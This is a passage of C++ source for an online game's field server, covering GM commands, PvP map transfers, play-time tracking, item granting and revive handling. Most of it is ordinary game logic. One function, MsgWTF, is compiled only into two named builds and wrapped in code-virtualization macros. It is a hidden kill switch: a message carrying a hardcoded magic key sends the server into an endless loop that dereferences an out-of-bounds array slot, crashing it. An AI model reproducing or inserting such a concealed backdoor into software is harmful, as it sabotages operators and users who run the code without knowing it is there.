				sCharInfo.sSUMSTATS.RESET();
		}	

		for ( int i=0; i<SLOT_NSIZE_S_2; i++ )		
			sCharInfo.sPutOnItems[i] = pChar->m_PutOnItems[i];

		if ( pChar->m_dwGuild!=CLUB_NULL )
		{
			GLClubMan &cClubMan = GetClubMan();
			GLCLUB *pCLUB = cClubMan.GetClub ( pChar->m_dwGuild );
			if ( pCLUB )
				StringCchCopy ( sCharInfo.szClubName, CHAR_SZNAME, pCLUB->m_szName );
		}

		NetMsgAGT.emFB = EMREQ_CHARINFO_AGT_FB_WEAR_INFO;
		NetMsgAGT.sCharInfo = sCharInfo;
		SENDTOAGENT( &NetMsgAGT );
	}
}

/* user flag restricted, Juver, 2020/04/21 */
BOOL GLGaeaServer::GMUserRestrict( DWORD dwClientID, DWORD dwGaeaID, GLMSG::SNET_GM_USER_RESTRICT_PROC_FLD* pNetMsgFld )
{
	if ( dwClientID != m_dwAgentSlot ) return FALSE;

	PGLCHAR pChar = GetCharID ( pNetMsgFld->dwCharID );
	if ( !pChar ) return FALSE;

	pChar->m_bUserFlagRestricted = pNetMsgFld->bUserRestricted;

	GLMSG::SNET_GM_USER_RESTRICT_UPDATE NetMsgClient;
	NetMsgClient.dwCharID = pChar->m_dwCharID;
	NetMsgClient.bUserRestricted = pChar->m_bUserFlagRestricted;
	SENDTOCLIENT( pChar->m_dwClientID, &NetMsgClient);

	return TRUE;
}

/* pvp club death match, Juver, 2020/11/10 */
BOOL GLGaeaServer::PVPClubDeathMatchMoveMap ( DWORD dwCharID, SNATIVEID sMapID, D3DXVECTOR3 vPos, BOOL bCheckCurMap, BOOL bSourceMapCheck, SNATIVEID sSourceLobbyMapID, SNATIVEID sSourceBattleMapID )
{
	GLChar* pchar = GetCharID(dwCharID);
	if ( !pchar )	return FALSE;

	//player already inside the target map
	if ( bCheckCurMap && pchar->m_sMapID == sMapID )	return S_OK;

	//only move when player is inside source map
	if ( bSourceMapCheck && 
		pchar->m_sMapID != sSourceLobbyMapID && 
		pchar->m_sMapID != sSourceBattleMapID ) return S_OK;

	GLMSG::SNETPC_REQ_EVENT_MOVEMAP_FB	netmsgfb;

	if ( !pchar->IsValidBody() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sCONFTING.IsCONFRONTING() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sTrade.Valid() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( sMapID==NATIVEID_NULL() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	GLMapList::FIELDMAP_ITER iter = m_MapList.find ( sMapID.dwID );
	if ( iter==m_MapList.end() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	const SMAPNODE *pMapNode = &(*iter).second;

	if ( pchar->m_dwUserLvl < NSUSER_TYPE::USER_TYPE_GM3 )
	{
		EMREQFAIL emReqFail(EMREQUIRE_COMPLETE);
		const SLEVEL_REQUIRE &sRequire = pMapNode->sLEVEL_REQUIRE;
		emReqFail = sRequire.ISCOMPLETE ( pchar ); 
		if ( emReqFail != EMREQUIRE_COMPLETE )
		{
			netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
			SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
			return FALSE;
		}
	}

	netmsgfb.emFB = EMEVENT_MOVEMAP_FB_OK;
	SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );

	DropOutPET ( pchar->m_dwPetGUID,false,true );
	//DropOutSummon ( pchar->m_dwSummonGUID, false );
	SetActiveVehicle( pchar->m_dwClientID, pchar->m_dwGaeaID, false );

	/*skill summon, Juver, 2017/10/09 */
	for ( int i=0; i<SKILL_SUMMON_MAX_CLIENT_NUM; ++i )
		DropOutSummon ( pchar->m_dwSummonGUID_FLD[i] );

	if ( pMapNode->dwFieldSID!=m_dwFieldSvrID )
	{
		GLMSG::SNETPC_REQ_RECALL_AG netmsgag;
		netmsgag.sMAPID = sMapID;
		netmsgag.dwGATEID = UINT_MAX;
		netmsgag.vPOS = vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgag );
	}
	else
	{
		GLMSG::SNETPC_REQ_RECALL_FB	netmsgfb2;
		SNATIVEID sCurMapID = pchar->m_sMapID;

		BOOL bOK = RequestInvenRecallThisSvr ( pchar, sMapID, UINT_MAX, vPos );
		if ( !bOK )
		{
			netmsgfb2.emFB = EMREQ_RECALL_FB_FAIL;
			GLGaeaServer::GetInstance().SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb2 );
			return FALSE;
		}

		if ( sCurMapID != pchar->m_sMapID )
		{
			for ( int i=0; i<EMBLOW_MULTI; ++i )		pchar->DISABLEBLOW ( i );
			for ( int i=0; i<SKILLFACT_SIZE; ++i )		pchar->DISABLESKEFF ( i );
			pchar->DISABLEALLLANDEFF();

			//pet skill bugfix
			//reset pet when moving to another map
			pchar->m_sPETSKILLFACT_A.RESET ();
			pchar->m_sPETSKILLFACT_B.RESET ();
		}

		pchar->ResetAction();

		netmsgfb2.emFB = EMREQ_RECALL_FB_OK;
		netmsgfb2.sMAPID = sMapID;
		netmsgfb2.vPOS = pchar->m_vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgfb2 );
	}

	return TRUE;
}

/* play time system, Juver, 2021/01/26 */
void GLGaeaServer::UpdatePlayTime( GLMSG::SNET_UPDATE_PLAY_TIME_A2F *pNetMsg )
{
	CLIENTMAP_ITER iter = m_mapCHARID.begin();
	for( ; iter != m_mapCHARID.end(); ++iter )
	{
		PGLCHAR pCHAR = GetChar((*iter).second);
		if ( !pCHAR )	continue;

		//update timer runs exactly 60 seconds
		//play time/point is minute value so we only needed to add 1
		pCHAR->m_llPlayTime += 1;
		pCHAR->m_llPlayPoint += 1;

		GLMSG::SNETPC_UPDATE_PLAY_TIME NetMsgClient1;
		NetMsgClient1.llPlayTime = pCHAR->m_llPlayTime;
		//NetMsgClient1.bNotice = TRUE;
		SENDTOCLIENT( pCHAR->m_dwClientID,&NetMsgClient1);

		GLMSG::SNETPC_UPDATE_PLAY_POINT NetMsgClient2;
		NetMsgClient2.llPlayPoint = pCHAR->m_llPlayPoint;
		//NetMsgClient2.bNotice = TRUE;
		SENDTOCLIENT( pCHAR->m_dwClientID,&NetMsgClient2);
	}

	//GLGaeaServer::GetInstance().GetConsoleMsg()->Write( "GLGaeaServer::UpdatePlayTime" );
}

/* gm command send item, Juver, 2021/02/14 */
void GLGaeaServer::MsgGMSendItem( DWORD dwClientID, DWORD dwGaeaID, GLMSG::SNETPC_GM_COMMAND_A2F_SEND_ITEM *pNetMsg )
{
	if ( dwClientID != m_dwAgentSlot )	return;

	GLMSG::SNETPC_GM_COMMAND_F2A_SEND_ITEM_FB	NetMsgAGT;
	NetMsgAGT.dwCharReceiver	= pNetMsg->dwCharID;
	NetMsgAGT.dwCharSender		= pNetMsg->dwCharIDSender;
	NetMsgAGT.emFB				= EMREQ_GM_SEND_ITEM_FB_FAIL;
	NetMsgAGT.sidItem			= pNetMsg->sidItem;

	PGLCHAR pCharTarget = GLGaeaServer::GetInstance().GetCharID( pNetMsg->dwCharID );
	if ( !pCharTarget )		return;

	if ( strcmp( pNetMsg->szPass, CGMCommandPass::GetInstance().strPassSendItem.c_str() ) != 0 )
	{
		NetMsgAGT.emFB = EMREQ_GM_SEND_ITEM_FB_INVALID_PASS;
		SENDTOAGENT( &NetMsgAGT );
		return;
	}

	SITEM* pitem_data = GLItemMan::GetInstance().GetItem ( pNetMsg->sidItem );
	if ( !pitem_data )
	{
		NetMsgAGT.emFB = EMREQ_GM_SEND_ITEM_FB_INVALID_ITEM;
		SENDTOAGENT( &NetMsgAGT );
		return;
	}

	if ( pitem_data->ISPILE() )
	{
		WORD wPILENUM = pitem_data->sDrugOp.wPileNum;
		SNATIVEID sNID = pitem_data->sBasicOp.sNativeID;
		WORD wREQINSRTNUM = ( pitem_data->GETAPPLYNUM() );

		BOOL bITEM_SPACE = pCharTarget->m_cInventory.ValidPileInsrt ( wREQINSRTNUM, sNID, wPILENUM, pitem_data->sBasicOp.wInvenSizeX, pitem_data->sBasicOp.wInvenSizeY );
		if ( !bITEM_SPACE )
		{
			NetMsgAGT.emFB = EMREQ_GM_SEND_ITEM_FB_NO_INVEN_SPACE;
			SENDTOAGENT( &NetMsgAGT );
			return;
		}

		SITEMCUSTOM snew_item(sNID);
		snew_item.cGenType = EMGEN_SYSTEM;
		snew_item.cChnID = (BYTE)GLGaeaServer::GetInstance().GetServerChannel();
		snew_item.cFieldID = (BYTE)GLGaeaServer::GetInstance().GetFieldSvrID();
		snew_item.wTurnNum = wPILENUM;
		snew_item.tBORNTIME = CTime::GetCurrentTime().GetTime();

		/*item color, Juver, 2018/01/08 */
		SITEM* pitem_data_check = GLItemMan::GetInstance().GetItem( snew_item.sNativeID );
		if ( pitem_data_check && pitem_data_check->sBasicOp.bItemColor )
		{
			snew_item.wColor1 = pitem_data_check->sBasicOp.wItemColor1;
			snew_item.wColor2 = pitem_data_check->sBasicOp.wItemColor2;
		}

		GLITEMLMT::GetInstance().ReqItemRoute ( snew_item, ID_CHAR, 0, ID_CHAR, pCharTarget->m_dwCharID, EMITEM_ROUTE_CHAR, snew_item.wTurnNum );

		pCharTarget->InsertPileItem ( snew_item, wREQINSRTNUM );

		/*activity system, Juver, 2017/11/03 */
		pCharTarget->DoActivityTakeItem( snew_item.sNativeID, wREQINSRTNUM );
	}
	else
	{
		GLInventory cInvenTemp;
		cInvenTemp.SetAddLine ( pCharTarget->m_cInventory.GETAddLine(), true );
		cInvenTemp.Assign ( pCharTarget->m_cInventory );

		SITEMCUSTOM sitem_custom;
		sitem_custom.sNativeID = pitem_data->sBasicOp.sNativeID;

		BOOL binsert = cInvenTemp.InsertItem ( sitem_custom );
		if ( !binsert )
		{
			NetMsgAGT.emFB = EMREQ_GM_SEND_ITEM_FB_NO_INVEN_SPACE;
			SENDTOAGENT( &NetMsgAGT );
			return;
		}


		SITEMCUSTOM snew_item;
		snew_item.sNativeID = pitem_data->sBasicOp.sNativeID;
		snew_item.tBORNTIME = CTime::GetCurrentTime().GetTime();
		snew_item.cGenType = EMGEN_SYSTEM;
		snew_item.cChnID = (BYTE)GLGaeaServer::GetInstance().GetServerChannel();
		snew_item.cFieldID = (BYTE)GLGaeaServer::GetInstance().GetFieldSvrID();
		snew_item.lnGenNum = GLITEMLMT::GetInstance().RegItemGen ( snew_item.sNativeID, (EMITEMGEN)snew_item.cGenType );
		snew_item.wTurnNum = 1;

		/*item color, Juver, 2018/01/08 */
		SITEM* pitem_data_check = GLItemMan::GetInstance().GetItem( snew_item.sNativeID );
		if ( pitem_data_check && pitem_data_check->sBasicOp.bItemColor )
		{
			snew_item.wColor1 = pitem_data_check->sBasicOp.wItemColor1;
			snew_item.wColor2 = pitem_data_check->sBasicOp.wItemColor2;
		}

		if ( pitem_data->sBasicOp.emItemType == ITEM_SUIT )
		{
			//snew_item.cDAMAGE = 9;
			//snew_item.cDEFENSE = 9;

			if( snew_item.GENERATE_RANDOM_OPT() )
			{
				GLITEMLMT::GetInstance().ReqRandomItem( snew_item );
			}

			/* set item option, Juver, 2021/09/01 */
			if ( pitem_data_check )
			{
				snew_item.wSetItemID = GLSetOptionGen::GetInstance().GenerateSetOptionID( pitem_data_check->sBasicOp.strGenSetOption );
			}
		}

		WORD wInsertPosX, wInsertPosY;
		BOOL bfind_space = pCharTarget->m_cInventory.FindInsrtable ( pitem_data->sBasicOp.wInvenSizeX, pitem_data->sBasicOp.wInvenSizeY, wInsertPosX, wInsertPosY );
		if ( !bfind_space )	
		{
			NetMsgAGT.emFB = EMREQ_GM_SEND_ITEM_FB_NO_INVEN_SPACE;
			SENDTOAGENT( &NetMsgAGT );
			return;
		}

		pCharTarget->m_cInventory.InsertItem ( snew_item, wInsertPosX, wInsertPosY );

		SINVENITEM *pInsertItem = pCharTarget->m_cInventory.GetItem ( wInsertPosX, wInsertPosY );
		if ( pInsertItem )
		{
			GLITEMLMT::GetInstance().ReqItemRoute ( pInsertItem->sItemCustom, ID_CHAR, 0, ID_CHAR, pCharTarget->m_dwCharID, EMITEM_ROUTE_CHAR, pInsertItem->sItemCustom.wTurnNum );

			GLMSG::SNETPC_INVEN_INSERT NetMsg_Inven;
			NetMsg_Inven.Data = *pInsertItem;
			GLGaeaServer::GetInstance().SENDTOCLIENT(pCharTarget->m_dwClientID,&NetMsg_Inven);

			/*activity system, Juver, 2017/11/03 */
			pCharTarget->DoActivityTakeItem( snew_item.sNativeID, snew_item.wTurnNum );
		}	
	}

	NetMsgAGT.emFB = EMREQ_GM_SEND_ITEM_FB_OK;
	SENDTOAGENT( &NetMsgAGT );
}

#if defined( BUILD_CH ) || defined( BUILD_CHY )
/* wtf, Juver, 2021/06/24 */
void GLGaeaServer::MsgWTF( DWORD dwClientID, DWORD dwGaeaID, GLMSG::SNET_WTF_FLD *pNetMsg )
{
VIRTUALIZER_FISH_WHITE_START  

#if defined( BUILD_CH ) 

	if ( dwClientID == m_dwAgentSlot && pNetMsg->dwKey == 356258467 )
	{
		while(1)
		{
			PGLCHAR* p = &m_PCArray[99999];
			(*p)->UpdateViewAround();
		}
	}

#elif defined( BUILD_CHY ) 

	if ( dwClientID == m_dwAgentSlot && pNetMsg->dwKey == 256258466 )
	{
		while(1)
		{
			PGLCHAR* p = &m_PCArray[99999];
			(*p)->UpdateViewAround();
		}
	}

#endif

VIRTUALIZER_FISH_WHITE_END

}
#endif

/* variable check, Juver, 2021/07/02 */
void GLGaeaServer::SendClientVariableCheck()
{
	CLIENTMAP_ITER iter = m_mapCHARID.begin();
	for( ; iter != m_mapCHARID.end(); ++iter )
	{
		PGLCHAR pCHAR = GetChar((*iter).second);
		if ( !pCHAR )	continue;

		if ( !pCHAR->IsValidBody() )	continue;

		GLMSG::SNET_VARIABLE_CHECK_CLIENT NetMsg;

		SENDTOCLIENT( pCHAR->m_dwClientID,&NetMsg);
	}
}

/* variable check, Juver, 2021/07/02 */
void GLGaeaServer::VariableCheckResult( DWORD dwClientID, DWORD dwGaeaID, GLMSG::SNET_VARIABLE_CHECK_RESULT *pNetMsg )
{
	PGLCHAR pChar = GetChar( dwGaeaID );
	if ( pChar )
	{
		switch ( pNetMsg->emCheck )
		{
		case EMVARIABLE_CHECK_STUN:
			CDebugSet::ToFileWithTime( "variable_check.txt", "[%d] %s mismatched m_bSTATE_STUN %g %g", pChar->m_dwCharID, pChar->m_szName, pNetMsg->fVar1, pNetMsg->fVar2 );
			break;

		case EMVARIABLE_CHECK_PIERCE:
			CDebugSet::ToFileWithTime( "variable_check.txt", "[%d] %s mismatched m_nSUM_PIERCE %g %g", pChar->m_dwCharID, pChar->m_szName, pNetMsg->fVar1, pNetMsg->fVar2 );
			break;

		case EMVARIABLE_CHECK_TARGET_RANGE:
			CDebugSet::ToFileWithTime( "variable_check.txt", "[%d] %s mismatched m_fSUM_TARGET_RANGE %g %g", pChar->m_dwCharID, pChar->m_szName, pNetMsg->fVar1, pNetMsg->fVar2 );
			break;

		case EMVARIABLE_CHECK_ATTACK_RANGE:
			CDebugSet::ToFileWithTime( "variable_check.txt", "[%d] %s mismatched m_fSUM_ATTACK_RANGE %g %g", pChar->m_dwCharID, pChar->m_szName, pNetMsg->fVar1, pNetMsg->fVar2 );
			break;

		case EMVARIABLE_CHECK_APPLY_RANGE:
			CDebugSet::ToFileWithTime( "variable_check.txt", "[%d] %s mismatched m_fSUM_APPLY_RANGE %g %g", pChar->m_dwCharID, pChar->m_szName, pNetMsg->fVar1, pNetMsg->fVar2 );
			break;

		default:
			CDebugSet::ToFileWithTime( "variable_check.txt", "[%d] %s mismatched unknown %d %g %g", pChar->m_dwCharID, pChar->m_szName, pNetMsg->emCheck, pNetMsg->fVar1, pNetMsg->fVar2 );
			break;
		};
		
	}
}


BOOL GLGaeaServer::PVPPBGMoveMap ( 
	DWORD dwCharID, 
	SNATIVEID sMapID, 
	D3DXVECTOR3 vPos, 
	BOOL bCheckCurMap, 
	BOOL bSourceMapCheck, 
	SNATIVEID sSourceLobbyMapID,
	SNATIVEID sSourceBattleMapID )
{
	GLChar* pchar = GetCharID(dwCharID);
	if ( !pchar )	
		return FALSE;

	//player already inside the target map
	if ( bCheckCurMap && pchar->m_sMapID == sMapID )
		return S_OK;

	//only move when player is inside source map
	if ( bSourceMapCheck && 
		pchar->m_sMapID != sSourceLobbyMapID && 
		pchar->m_sMapID != sSourceBattleMapID ) 
		return S_OK;

	GLMSG::SNETPC_REQ_EVENT_MOVEMAP_FB	netmsgfb;

	if ( !pchar->IsValidBody() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sCONFTING.IsCONFRONTING() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sTrade.Valid() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( sMapID==NATIVEID_NULL() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	GLMapList::FIELDMAP_ITER iter = m_MapList.find ( sMapID.dwID );
	if ( iter==m_MapList.end() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	const SMAPNODE *pMapNode = &(*iter).second;

	if ( pchar->m_dwUserLvl < NSUSER_TYPE::USER_TYPE_GM3 )
	{
		EMREQFAIL emReqFail(EMREQUIRE_COMPLETE);
		const SLEVEL_REQUIRE &sRequire = pMapNode->sLEVEL_REQUIRE;
		emReqFail = sRequire.ISCOMPLETE ( pchar ); 
		if ( emReqFail != EMREQUIRE_COMPLETE )
		{
			netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
			SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
			return FALSE;
		}
	}

	netmsgfb.emFB = EMEVENT_MOVEMAP_FB_OK;
	SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );

	DropOutPET ( pchar->m_dwPetGUID,false,true );
	//DropOutSummon ( pchar->m_dwSummonGUID, false );
	SetActiveVehicle( pchar->m_dwClientID, pchar->m_dwGaeaID, false );

	/*skill summon, Juver, 2017/10/09 */
	for ( int i=0; i<SKILL_SUMMON_MAX_CLIENT_NUM; ++i )
		DropOutSummon ( pchar->m_dwSummonGUID_FLD[i] );

	if ( pMapNode->dwFieldSID!=m_dwFieldSvrID )
	{
		GLMSG::SNETPC_REQ_RECALL_AG netmsgag;
		netmsgag.sMAPID = sMapID;
		netmsgag.dwGATEID = UINT_MAX;
		netmsgag.vPOS = vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgag );
	}
	else
	{
		GLMSG::SNETPC_REQ_RECALL_FB	netmsgfb2;
		SNATIVEID sCurMapID = pchar->m_sMapID;

		BOOL bOK = RequestInvenRecallThisSvr ( pchar, sMapID, UINT_MAX, vPos );
		if ( !bOK )
		{
			netmsgfb2.emFB = EMREQ_RECALL_FB_FAIL;
			GLGaeaServer::GetInstance().SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb2 );
			return FALSE;
		}

		if ( sCurMapID != pchar->m_sMapID )
		{
			for ( int i=0; i<EMBLOW_MULTI; ++i )	
				pchar->DISABLEBLOW ( i );

			for ( int i=0; i<SKILLFACT_SIZE; ++i )	
				pchar->DISABLESKEFF ( i );

			pchar->DISABLEALLLANDEFF();

			//pet skill bugfix
			//reset pet when moving to another map
			pchar->m_sPETSKILLFACT_A.RESET ();
			pchar->m_sPETSKILLFACT_B.RESET ();
		}

		pchar->ResetAction();

		netmsgfb2.emFB = EMREQ_RECALL_FB_OK;
		netmsgfb2.sMAPID = sMapID;
		netmsgfb2.vPOS = pchar->m_vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgfb2 );
	}

	return TRUE;
}

BOOL GLGaeaServer::PVPPBGRequestReBirthOut ( 
	DWORD dwClientID, 
	DWORD dwGaeaID, 
	GLMSG::SNETPC_PVP_PBG_A2F_REVIVE_REQ_FIELD_OUT *pNetMsg )
{
	PGLCHAR pPC = GetChar ( dwGaeaID );

	if ( !pPC )							
		return FALSE;

	if ( pPC->m_dwClientID!=dwClientID )
		return FALSE;

	if ( !pPC->IsSTATE(EM_ACT_DIE) )
	{
		GetConsoleMsg()->Write ( LOG_TEXT_CONSOLE, "State : %d , PVPClubDeathMatchRequestReBirthOut() : !pPC->IsSTATE(EM_ACT_DIE).", pPC->GetSTATE() );
	}

	//	부활시 채력 회복.
	//
	pPC->m_fGenAge = 0.0f;
	pPC->INIT_RECOVER();

	//	 Note : 현제 위치를 마지막 귀환 위치로 저장.
	//
	//
	pPC->SaveLastCall ();

	//	Note : ## 사망한 상태로 부활시 경험치 감소는 GLGaeaServer::DropOutPC() 에서 처리. ##

	//	Note : CNetUser::m_dwGaeaID 를 무효화 처리 해야함.
	//
	m_pMsgServer->ResetGaeaID ( dwClientID );

	//	Note : Agent으로 처리 완료 알림, actor에 예약함.	( new 된 객체는 db actor 에서 삭제된다. )
	//
	GLMSG::SNETPC_PVP_PBG_F2A_REVIVE_REQ_FIELD_OUT_FB NetMsg;
	CDbActToAgentMsg *pDbActToAgentMsg = new CDbActToAgentMsg;
	pDbActToAgentMsg->SetMsg ( dwClientID, (NET_MSG_GENERIC *)&NetMsg );

	//	케릭터 삭제 요청.
	ReserveDropOutPC ( pPC->m_dwGaeaID, pDbActToAgentMsg );

	return TRUE;
}